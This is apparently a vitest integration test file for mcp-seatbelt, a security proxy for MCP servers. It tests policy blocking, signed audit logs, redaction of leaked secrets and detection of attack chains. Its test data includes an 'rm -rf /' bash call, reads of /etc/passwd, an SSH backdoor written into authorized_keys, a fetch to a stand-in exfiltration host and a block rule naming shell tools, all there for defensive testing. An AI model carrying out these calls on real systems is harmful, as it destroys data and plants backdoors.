/**
 * Integration tests: real MCP servers proxied through mcp-seatbelt.
 *
 * Tests 1-4 spawn the real seatbelt proxy CLI (`src/index.ts proxy`) via
 * child_process.spawn with an isolated $HOME whose `.cursor/mcp.json`
 * registers real MCP servers (@modelcontextprotocol/server-filesystem,
 * @modelcontextprotocol/server-memory, plus small purpose-built stdio
 * servers). JSON-RPC requests are sent through the running proxy over HTTP
 * with fetch().
 *
 * Test 5 runs ProxyServer in-process instead: the proxy tracks attack chains
 * with a stable per-server session id, so a multi-request chain escalates
 * across HTTP calls to the same registered server.
 *
 * Resilience: describes that need the real @modelcontextprotocol servers are
 * skipped (describe.skipIf) when those packages are not installed.
 */

import { describe, it, expect, beforeEach, afterEach, afterAll } from 'vitest';
import { spawn, execFileSync, type ChildProcess } from 'node:child_process';
import { existsSync, mkdirSync, rmSync, writeFileSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { randomUUID } from 'node:crypto';
import { ProxyServer } from '../src/proxy/server.js';
import { PolicyEngine } from '../src/policy/engine.js';
import { AuditTrail } from '../src/audit.js';
import { trackCall, cleanupSession } from '../src/security/attack-chains.js';

const PROJECT_ROOT = join(__dirname, '..');
const TSX = join(PROJECT_ROOT, 'node_modules', '.bin', 'tsx');
const CLI_ENTRY = join(PROJECT_ROOT, 'src', 'index.ts');
const FS_SERVER_ENTRY = join(
  PROJECT_ROOT, 'node_modules', '@modelcontextprotocol', 'server-filesystem', 'dist', 'index.js',
);
const MEM_SERVER_ENTRY = join(
  PROJECT_ROOT, 'node_modules', '@modelcontextprotocol', 'server-memory', 'dist', 'index.js',
);

const FS_SERVER_AVAILABLE = existsSync(FS_SERVER_ENTRY);
const MEM_SERVER_AVAILABLE = existsSync(MEM_SERVER_ENTRY);

// ---------------------------------------------------------------------------
// Shared helpers
// ---------------------------------------------------------------------------

const tempDirs: string[] = [];
const childProcesses: ChildProcess[] = [];

function tmpDir(): string {
  const dir = join(tmpdir(), `mcp-seatbelt-itest-${randomUUID()}`);
  mkdirSync(dir, { recursive: true });
  tempDirs.push(dir);
  return dir;
}

function writeMcpConfig(
  home: string,
  servers: Record<string, { command: string; args: string[]; env?: Record<string, string> }>,
): void {
  const cursorDir = join(home, '.cursor');
  mkdirSync(cursorDir, { recursive: true });
  writeFileSync(join(cursorDir, 'mcp.json'), JSON.stringify({ mcpServers: servers }), 'utf-8');
}

function policyYaml(mode: 'enforce' | 'audit', rules: string): string {
  const rulesSection = rules.trim().length > 0 ? `rules:\n${rules}` : 'rules: []';
  return `version: "1"
mode: ${mode}
defaultAction: allow
${rulesSection}
allowlist:
  tools: []
  paths: []
  hosts: []
  envVars: []
allowSampling: true
`;
}

interface RunningProxy {
  child: ChildProcess;
  port: number;
  stderrTail: () => string;
}

async function waitForHealth(port: number, timeoutMs = 90_000): Promise<boolean> {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      const res = await fetch(`http://localhost:${port}/health`);
      if (res.ok) return true;
    } catch {
      // not up yet
    }
    await new Promise((r) => setTimeout(r, 250));
  }
  return false;
}

/**
 * Spawn the real seatbelt proxy CLI as a child process with an isolated HOME.
 * Returns null (after killing the child) if the proxy never becomes healthy.
 */
async function startSeatbeltProxy(opts: {
  home: string;
  policyPath: string;
  extraArgs?: string[];
}): Promise<RunningProxy | null> {
  const port = 19400 + Math.floor(Math.random() * 2000);
  let stderr = '';
  const child = spawn(
    TSX,
    [CLI_ENTRY, 'proxy', '--port', String(port), '--config', opts.policyPath, '--no-watch', ...(opts.extraArgs ?? [])],
    {
      cwd: opts.home,
      env: { ...process.env, HOME: opts.home, CI: 'true', NO_COLOR: '1' },
      stdio: ['pipe', 'pipe', 'pipe'],
    },
  );
  childProcesses.push(child);
  child.stdout?.on('data', () => {}); // drain so the child never blocks on a full pipe
  child.stderr?.on('data', (d: Buffer) => {
    stderr = (stderr + d.toString()).slice(-4000);
  });

  const healthy = await waitForHealth(port);
  if (!healthy) {
    try { child.kill('SIGKILL'); } catch {}
    return null;
  }
  return { child, port, stderrTail: () => stderr };
}

async function stopProxy(child: ChildProcess | undefined): Promise<void> {
  if (!child || child.killed || child.exitCode !== null) return;
  await new Promise<void>((resolve) => {
    const timer = setTimeout(() => {
      try { child.kill('SIGKILL'); } catch {}
      resolve();
    }, 8000);
    child.once('close', () => {
      clearTimeout(timer);
      resolve();
    });
    try { child.kill('SIGTERM'); } catch {
      clearTimeout(timer);
      resolve();
    }
  });
}

interface RpcResult {
  status: number;
  body: any;
}

async function rpc(port: number, server: string, method: string, params?: unknown, id = 1): Promise<RpcResult> {
  const res = await fetch(`http://localhost:${port}/${server}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', method, params, id }),
  });
  const body = await res.json().catch(() => null);
  return { status: res.status, body };
}

async function waitForFileContent(path: string, needle: string, timeoutMs = 15_000): Promise<string | null> {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    if (existsSync(path)) {
      try {
        const content = readFileSync(path, 'utf-8');
        if (content.includes(needle)) return content;
      } catch {
        // retry
      }
    }
    await new Promise((r) => setTimeout(r, 200));
  }
  return null;
}

afterEach(async () => {
  for (const child of childProcesses.splice(0)) {
    await stopProxy(child);
  }
  for (const dir of tempDirs.splice(0)) {
    try { rmSync(dir, { recursive: true, force: true }); } catch {}
  }
});

afterAll(() => {
  // Safety net: kill any leftover processes spawned by these tests. The proxy
  // CLI carries the temp dir in its --config arg and the filesystem server
  // carries the workspace dir in argv, so the temp-dir prefix uniquely
  // identifies our own processes without touching anything else.
  try {
    const out = execFileSync('pgrep', ['-f', 'mcp-seatbelt-itest-'], {
      encoding: 'utf-8',
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    for (const pidStr of out.split('\n').map((s) => s.trim()).filter(Boolean)) {
      const pid = Number(pidStr);
      if (pid && pid !== process.pid) {
        try { process.kill(pid, 'SIGTERM'); } catch {}
      }
    }
  } catch {
    // pgrep exits non-zero when nothing matches — the common, expected case
  }
});

// ---------------------------------------------------------------------------
// Test 1: Real filesystem server through the proxy
// ---------------------------------------------------------------------------

describe.skipIf(!FS_SERVER_AVAILABLE)('Test 1: real filesystem server through proxy', () => {
  let proxy: RunningProxy | null = null;
  let workspace: string;

  beforeEach(async () => {
    const home = tmpDir();
    workspace = join(home, 'workspace');
    mkdirSync(workspace, { recursive: true });
    writeFileSync(join(workspace, 'file.txt'), 'hello from the workspace\n', 'utf-8');

    writeMcpConfig(home, {
      filesystem: { command: 'node', args: [FS_SERVER_ENTRY, workspace] },
    });

    // Policy: only workspace paths may be touched — /etc is off limits.
    const policyPath = join(home, 'policy.yml');
    writeFileSync(
      policyPath,
      policyYaml(
        'enforce',
        `  - id: deny-outside-workspace
    description: "Only allow file access inside the workspace"
    target: file
    match: contains
    values:
      - "/etc"
    action: deny`,
      ),
      'utf-8',
    );

    proxy = await startSeatbeltProxy({ home, policyPath });
    if (!proxy) {
      throw new Error(`seatbelt proxy did not become healthy: ${proxy?.stderrTail?.() ?? 'no stderr'}`);
    }
  }, 120_000);

  it('lists tools, allows workspace reads, and blocks /etc reads and writes', async () => {
    const port = proxy!.port;

    // 1. tools/list — the real filesystem server's tools are visible
    const list = await rpc(port, 'filesystem', 'tools/list');
    expect(list.status).toBe(200);
    expect(list.body.error).toBeUndefined();
    const toolNames = (list.body.result?.tools ?? []).map((t: any) => t.name);
    expect(toolNames).toContain('read_file');
    expect(toolNames).toContain('write_file');

    // 2. Read /workspace/file.txt — allowed by policy, served by the real server
    const allowed = await rpc(port, 'filesystem', 'tools/call', {
      name: 'read_file',
      arguments: { path: join(workspace, 'file.txt') },
    }, 2);
    expect(allowed.status).toBe(200);
    expect(allowed.body.error).toBeUndefined();
    const text = allowed.body.result?.content?.[0]?.text ?? '';
    expect(text).toContain('hello from the workspace');

    // 3. Read /etc/passwd — blocked by the seatbelt policy before upstream
    const blockedRead = await rpc(port, 'filesystem', 'tools/call', {
      name: 'read_file',
      arguments: { path: '/etc/passwd' },
    }, 3);
    expect(blockedRead.body.error).toBeDefined();
    expect(blockedRead.body.error.code).toBe(-32001);
    expect(blockedRead.body.error.message).toMatch(/Blocked by MCP Seatbelt|Path safety/i);

    // 4. Write /etc/malicious — blocked the same way
    const blockedWrite = await rpc(port, 'filesystem', 'tools/call', {
      name: 'write_file',
      arguments: { path: '/etc/malicious', content: 'pwned' },
    }, 4);
    expect(blockedWrite.body.error).toBeDefined();
    expect(blockedWrite.body.error.code).toBe(-32001);
    expect(blockedWrite.body.error.message).toMatch(/Blocked by MCP Seatbelt|Path safety/i);

    // 5. Proxy stats confirm at least two blocked calls
    const health = await fetch(`http://localhost:${port}/health`).then((r) => r.json());
    expect(health.stats.blocked).toBeGreaterThanOrEqual(2);
  }, 120_000);
});

// ---------------------------------------------------------------------------
// Test 2: Real memory server through the proxy (read allowed, write denied)
// ---------------------------------------------------------------------------

describe.skipIf(!MEM_SERVER_AVAILABLE)('Test 2: real memory server through proxy', () => {
  let proxy: RunningProxy | null = null;

  beforeEach(async () => {
    const home = tmpDir();

    writeMcpConfig(home, {
      memory: {
        command: 'node',
        args: [MEM_SERVER_ENTRY],
        env: { MEMORY_FILE_PATH: join(home, 'memory.json') },
      },
    });

    // Policy: read-only memory — all create_*/add_*/delete_* tools denied.
    const policyPath = join(home, 'policy.yml');
    writeFileSync(
      policyPath,
      policyYaml(
        'enforce',
        `  - id: memory-read-only
    description: "Memory server is read-only for this agent"
    target: command
    match: pattern
    values:
      - "^(create|add|delete)_"
    action: deny`,
      ),
      'utf-8',
    );

    proxy = await startSeatbeltProxy({ home, policyPath });
    if (!proxy) {
      throw new Error(`seatbelt proxy did not become healthy: ${proxy?.stderrTail?.() ?? 'no stderr'}`);
    }
  }, 120_000);

  it('lists memory tools, allows read_graph, and blocks create_entities', async () => {
    const port = proxy!.port;

    // 1. tools/list — read tools visible; denied write tools are filtered out
    const list = await rpc(port, 'memory', 'tools/list');
    expect(list.status).toBe(200);
    const toolNames = (list.body.result?.tools ?? []).map((t: any) => t.name);
    expect(toolNames).toContain('read_graph');
    expect(toolNames).toContain('search_nodes');
    expect(toolNames).not.toContain('create_entities');
    expect(toolNames).not.toContain('delete_entities');

    // 2. Read-only operation works through the proxy
    const read = await rpc(port, 'memory', 'tools/call', { name: 'read_graph', arguments: {} }, 2);
    expect(read.status).toBe(200);
    expect(read.body.error).toBeUndefined();
    const graphText = read.body.result?.content?.[0]?.text ?? '';
    expect(graphText).toContain('entities');

    // 3. Write operation is blocked by the seatbelt policy
    const write = await rpc(port, 'memory', 'tools/call', {
      name: 'create_entities',
      arguments: { entities: [{ name: 'evil', entityType: 'malware', observations: ['pwned'] }] },
    }, 3);
    expect(write.body.error).toBeDefined();
    expect(write.body.error.code).toBe(-32001);
    expect(write.body.error.message).toContain('Blocked by MCP Seatbelt');
  }, 120_000);
});

// ---------------------------------------------------------------------------
// Test 3: Policy rule enforcement + audit log
// ---------------------------------------------------------------------------

describe.skipIf(!FS_SERVER_AVAILABLE)('Test 3: policy rule enforcement and audit log', () => {
  const SHELL_BLOCK_RULE = `  - id: block-shell-commands
    description: "Block shell command execution"
    target: command
    match: contains
    values:
      - "bash"
      - "shell"
      - "exec"
    action: deny`;

  function setupHome(): { home: string; workspace: string } {
    const home = tmpDir();
    const workspace = join(home, 'workspace');
    mkdirSync(workspace, { recursive: true });
    writeFileSync(join(workspace, 'safe.txt'), 'safe contents\n', 'utf-8');
    writeMcpConfig(home, {
      filesystem: { command: 'node', args: [FS_SERVER_ENTRY, workspace] },
    });
    return { home, workspace };
  }

  it('blocks shell commands, allows safe reads, and counts the block in proxy stats', async () => {
    const { home, workspace } = setupHome();
    const policyPath = join(home, 'policy.yml');
    writeFileSync(policyPath, policyYaml('enforce', SHELL_BLOCK_RULE), 'utf-8');

    const proxy = await startSeatbeltProxy({ home, policyPath });
    if (!proxy) throw new Error('seatbelt proxy did not become healthy');
    const port = proxy.port;

    // 1. A bash command is blocked by the custom policy rule
    const bash = await rpc(port, 'filesystem', 'tools/call', {
      name: 'bash',
      arguments: { command: 'rm -rf /' },
    }, 1);
    expect(bash.body.error).toBeDefined();
    expect(bash.body.error.code).toBe(-32001);
    expect(bash.body.error.message).toContain('Blocked by MCP Seatbelt');
    expect(bash.body.error.message).toContain('block-shell-commands');

    // 2. A safe read through the real filesystem server still works
    const read = await rpc(port, 'filesystem', 'tools/call', {
      name: 'read_file',
      arguments: { path: join(workspace, 'safe.txt') },
    }, 2);
    expect(read.status).toBe(200);
    expect(read.body.error).toBeUndefined();
    expect(read.body.result?.content?.[0]?.text ?? '').toContain('safe contents');

    // 3. The block shows up in the proxy's own accounting
    const health = await fetch(`http://localhost:${port}/health`).then((r) => r.json());
    expect(health.stats.totalRequests).toBeGreaterThanOrEqual(2);
    expect(health.stats.blocked).toBeGreaterThanOrEqual(1);
  }, 120_000);

  it('records the intercepted call in the signed audit log', async () => {
    // Note: PolicyEngine only writes audit-trail entries in `audit` mode (by
    // design — enforce mode blocks pre-forward without recording). So the
    // audit assertion runs a second proxy with the same policy in audit mode
    // plus --audit-file/--audit-secret, and replays the same shell call.
    const { home } = setupHome();
    const policyPath = join(home, 'policy.yml');
    writeFileSync(policyPath, policyYaml('audit', SHELL_BLOCK_RULE), 'utf-8');

    const auditFile = join(home, 'audit.jsonl');
    const auditSecret = `test-secret-${randomUUID()}`;

    const proxy = await startSeatbeltProxy({
      home,
      policyPath,
      extraArgs: ['--audit-file', auditFile, '--audit-secret', auditSecret],
    });
    if (!proxy) throw new Error('seatbelt proxy did not become healthy');
    const port = proxy.port;

    // Replay the same shell command — in audit mode it is allowed through to
    // the upstream (which rejects the unknown tool), but it must be logged.
    await rpc(port, 'filesystem', 'tools/call', {
      name: 'bash',
      arguments: { command: 'rm -rf /' },
    }, 1);

    // Audit appends are fire-and-forget inside the proxy; poll for the entry.
    const content = await waitForFileContent(auditFile, '"bash"');
    expect(content).not.toBeNull();

    const entries = content!
      .split('\n')
      .filter((line) => line.trim().length > 0)
      .map((line) => JSON.parse(line));
    const bashEntry = entries.find((e) => e.toolName === 'bash');
    expect(bashEntry).toBeDefined();
    expect(bashEntry.args).toEqual({ command: 'rm -rf /' });
    expect(typeof bashEntry.timestamp).toBe('string');

    // The HMAC-signed log verifies cleanly with the same secret.
    const trail = new AuditTrail(auditFile, auditSecret);
    const verification = await trail.verify();
    expect(verification.total).toBeGreaterThanOrEqual(1);
    expect(verification.tampered).toBe(0);
    expect(verification.valid).toBe(true);
  }, 120_000);
});

// ---------------------------------------------------------------------------
// Test 4: Response DLP through the proxy
// ---------------------------------------------------------------------------

describe('Test 4: response DLP through proxy', () => {
  const FAKE_AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'; // AWS's well-known documentation example key

  // Minimal stdio MCP server whose only tool leaks a fake AWS key in its
  // response — no external package required.
  const LEAKY_SERVER_SCRIPT = `
const rl = require('readline').createInterface({ input: process.stdin });
rl.on('line', (line) => {
  let req;
  try { req = JSON.parse(line); } catch { return; }
  if (req.method === 'tools/list') {
    console.log(JSON.stringify({
      jsonrpc: '2.0',
      id: req.id,
      result: { tools: [{ name: 'get_leaky_config', description: 'Returns deployment config', inputSchema: { type: 'object', properties: {} } }] },
    }));
    return;
  }
  if (req.method === 'tools/call') {
    console.log(JSON.stringify({
      jsonrpc: '2.0',
      id: req.id,
      result: { content: [{ type: 'text', text: 'deploy config rotated AWS credential ${FAKE_AWS_KEY} last week' }] },
    }));
    return;
  }
  console.log(JSON.stringify({ jsonrpc: '2.0', id: req.id, result: {} }));
});
`;

  let proxy: RunningProxy | null = null;

  beforeEach(async () => {
    const home = tmpDir();
    const scriptPath = join(home, 'leaky-server.cjs');
    writeFileSync(scriptPath, LEAKY_SERVER_SCRIPT, 'utf-8');

    writeMcpConfig(home, {
      leaky: { command: 'node', args: [scriptPath] },
    });

    // Allow everything — DLP (enabled by default) must still redact the response.
    const policyPath = join(home, 'policy.yml');
    writeFileSync(policyPath, policyYaml('enforce', ''), 'utf-8');

    proxy = await startSeatbeltProxy({ home, policyPath });
    if (!proxy) throw new Error('seatbelt proxy did not become healthy');
  }, 120_000);

  it('redacts an AWS key returned by the upstream server', async () => {
    const port = proxy!.port;

    const res = await rpc(port, 'leaky', 'tools/call', { name: 'get_leaky_config', arguments: {} }, 1);
    expect(res.status).toBe(200);
    expect(res.body.error).toBeUndefined();

    const payload = JSON.stringify(res.body.result);
    expect(payload).toContain('[REDACTED-aws-access-key]');
    expect(payload).not.toContain(FAKE_AWS_KEY);
  }, 120_000);
});

// ---------------------------------------------------------------------------
// Test 5: Attack chain detection through the proxy
// ---------------------------------------------------------------------------

describe('Test 5: attack chain detection through proxy', () => {
  // The proxy tracks attack chains with a stable per-server session id, so a
  // sequence of calls through the same registered server escalates exactly as
  // it would for a real agent session.
  const FIXED_NOW = 1_700_000_000_000;
  const SERVER_NAME = 'attackfs';
  const SESSION_ID = SERVER_NAME;

  const ECHO_SERVER_SCRIPT = `
const rl = require('readline').createInterface({ input: process.stdin });
rl.on('line', (line) => {
  try {
    const req = JSON.parse(line);
    const result = req.method === 'tools/list' ? { tools: [] } : {};
    console.log(JSON.stringify({ jsonrpc: '2.0', result, id: req.id }));
  } catch (e) {}
});
`;

  let proxy: ProxyServer | undefined;

  afterEach(async () => {
    cleanupSession(SESSION_ID);
    if (proxy) {
      try { await proxy.stop(); } catch {}
      proxy = undefined;
    }
  });

  /** Read the session's current chain state without advancing the machine
   *  (this tool name classifies to no event). */
  function probeChainState(): string {
    return trackCall({ toolName: 'noop_observe', args: {}, sessionId: SESSION_ID, timestamp: FIXED_NOW }).state;
  }

  it('escalates read /etc/passwd -> write authorized_keys and blocks on exfiltration', async () => {
    const policy = new PolicyEngine({
      version: '1',
      mode: 'enforce',
      defaultAction: 'allow',
      rules: [],
      allowlist: { tools: [], paths: [], hosts: [], envVars: [] },
      allowSampling: true,
    });

    proxy = new ProxyServer(policy, 0);
    proxy.registerServer({
      name: SERVER_NAME,
      command: 'node',
      args: ['-e', ECHO_SERVER_SCRIPT.trim()],
      transport: 'stdio',
      risk: { score: 0, level: 'low', flags: [] },
    });
    await proxy.start();

    const port = (proxy as any).httpServer?.address()?.port;
    expect(port).toBeGreaterThan(0);

    // Step 1: agent reads a sensitive file. The proxy's path-safety layer
    // blocks the response, and the chain tracker moves idle -> reconnaissance.
    const step1 = await rpc(port, SERVER_NAME, 'tools/call', {
      name: 'read_file',
      arguments: { path: '/etc/passwd' },
    }, 1);
    expect(step1.body.error).toBeDefined();
    expect(step1.body.error.code).toBe(-32001);
    expect(probeChainState()).toBe('reconnaissance');

    // Step 2: agent writes an SSH backdoor — chain escalates to persistence.
    const step2 = await rpc(port, SERVER_NAME, 'tools/call', {
      name: 'write_file',
      arguments: { path: '/home/agent/.ssh/authorized_keys', content: 'ssh-rsa AAAA-backdoor' },
    }, 2);
    expect(step2.status).toBe(200);
    expect(step2.body.error).toBeUndefined();
    expect(probeChainState()).toBe('persistence');

    // Step 3: agent makes a network call — chain escalates to exfiltration_attempt.
    const step3 = await rpc(port, SERVER_NAME, 'tools/call', {
      name: 'fetch_url',
      arguments: { url: 'https://evil.invalid/collect' },
    }, 3);
    expect(step3.status).toBe(200);
    expect(probeChainState()).toBe('exfiltration_attempt');

    // Step 4: a large read on top of the attempt confirms exfiltration — the
    // proxy itself now blocks with the attack-chain error.
    const step4 = await rpc(port, SERVER_NAME, 'tools/call', {
      name: 'read_file',
      arguments: { path: '/tmp/big.bin', size: 5_000_000 },
    }, 4);
    expect(step4.status).toBe(400);
    expect(step4.body.error).toBeDefined();
    expect(step4.body.error.code).toBe(-32001);
    expect(step4.body.error.message).toContain('attack chain detected');
    expect(step4.body.error.message).toContain('exfiltration confirmed');
  }, 60_000);
});
